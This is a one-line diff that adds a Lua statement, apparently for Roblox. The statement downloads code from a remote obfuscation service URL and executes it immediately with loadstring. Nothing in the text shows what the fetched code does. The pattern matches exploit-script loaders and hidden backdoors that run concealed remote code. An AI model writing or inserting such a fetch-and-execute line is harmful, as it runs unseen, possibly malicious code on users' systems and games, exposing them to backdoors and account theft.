@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://sinobfuscator.up.railway.app/raw/a5c3481bf71ca0f2"))()
